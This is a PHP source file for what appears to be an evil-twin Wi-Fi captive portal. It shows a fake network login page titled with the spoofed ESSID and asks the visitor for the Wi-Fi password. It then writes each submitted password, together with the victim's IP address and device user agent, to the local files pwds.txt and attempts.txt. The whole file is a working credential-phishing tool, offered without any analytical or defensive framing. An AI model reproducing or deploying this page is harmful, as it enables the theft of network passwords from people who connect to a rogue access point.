  <?php

function getparametr($search_string)
{
	$lines_array = file("language.txt");
foreach($lines_array as $line) {
    if(strpos($line, $search_string) !== false) {
        list(, $search_string ) = explode(":", $line);
				return $search_string ;

		}
	}

}
function getparametr2($search_string)
{
	$lines_array = file("parameters.txt");
foreach($lines_array as $line) {
    if(strpos($line, $search_string) !== false) {
        list(, $search_string ) = explode(":", $line);
				return $search_string ;

		}
	}

}

$essid=getparametr2("essid");
$manufacturer=getparametr2("vendor");
$name=getparametr("name") ;
$vendor=getparametr("vendor") ;
$submit=getparametr("submit ") ;
$message1=getparametr("message1") ;
$message2=getparametr("message2") ;
$message3=getparametr("message3") ;
$message4=getparametr("message4") ;
function substrwords($text, $maxchar, $end='...') {
    if (strlen($text) > $maxchar || $text == '') {
        $words = preg_split('/\s/', $text);      
        $output = '';
        $i      = 0;
        while (1) {
            $length = strlen($output)+strlen($words[$i]);
            if ($length > $maxchar) {
                break;
            } 
            else {
                $output .= " " . $words[$i];
                ++$i;
            }
        }
        $output .= $end;
    } 
    else {
        $output = $text;
    }
    return $output;
}

error_reporting(0);
$pwd = $_POST["key1"];

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$ua = str_replace("Mozilla/5.0","  ","$ua");
$ua = str_replace("Chrome/80.0.3987.162 "," ","$ua");
$ua = str_replace(" Safari/537.36 "," ","$ua");
$ua = str_replace("(KHTML, like Gecko)"," ","$ua");
$ua = str_replace(" AppleWebKit/537.36 "," ","$ua");
$ua = str_replace("  "," ","$ua");
$ua = str_replace("("," ","$ua");
$ua = str_replace(")"," ","$ua");
$ua = str_replace("Safari/537.36"," ","$ua");
$ua = str_replace("SamsungBrowser/10.2"," ","$ua");
$ua = str_replace("Chrome/71.0.3578.99"," ","$ua");
$ua = substrwords($ua,40);


$count_my_page = ("viewed.txt");
$hits = file($count_my_page);
$hits[0] ++;
$fp = fopen($count_my_page , "w");
fputs($fp , $hits[0]);
fclose($fp);

$content = "Passsword : '$pwd' <#> IP : $ip <#> Device : $ua \n";
if(!empty($pwd)){


$myfile = fopen("pwds.txt", "a+") or die("Unable to open file!");
fwrite($myfile, $content);
fclose($myfile);
$myfile = fopen("attempts.txt", "a+") or die("Unable to open file!");
$txt = "$pwd\n";
fwrite($myfile, $txt );
fclose($myfile);
} 

?> 
<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="viewport" content="width=device-width, initial-scale=1">

<head>

  <link rel="stylesheet" type="text/css" href="theme.css">
<meta charset="utf-8"/>

<title>connect</title>
<script src="js/jquery.validate.min.js"></script>
</head>
<body>


<script>
function showpassword() {
  var x = document.getElementById("key1");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}
</script>

 


      <form action="index.php" class="login-form"  method="POST" >
        <h1><?php echo $essid ?></h1>
		<h2>Password</h2>

		<div class="txtb">
      <input name="key1" id="key1" type="password"   placeholder="Enter Password"  minlength="8" >
        </div>
			<div class="mrg">
<input type="checkbox" onclick="showpassword()">Show Password<br>
   </div>
   <div class="mrg">
  <input type="checkbox" name="Auto connect" value="Auto connect"> Auto connect<br>
   </div>
        <input type="submit" class="logbtn" value="connect"> <input  type="submit" disabled="disabled" class="cancel" value="cancel">

        
      </form>


       <script src="js/main.js"></script>
<script>
    $.extend( $.validator.messages, {
        required: "<?php echo $message3 ?>.",
        maxlength: $.validator.format( "<?php echo $message4 ?>" ),
        minlength: $.validator.format( "<?php echo $message5 ?>" )});
  </script>
</body>
</html>
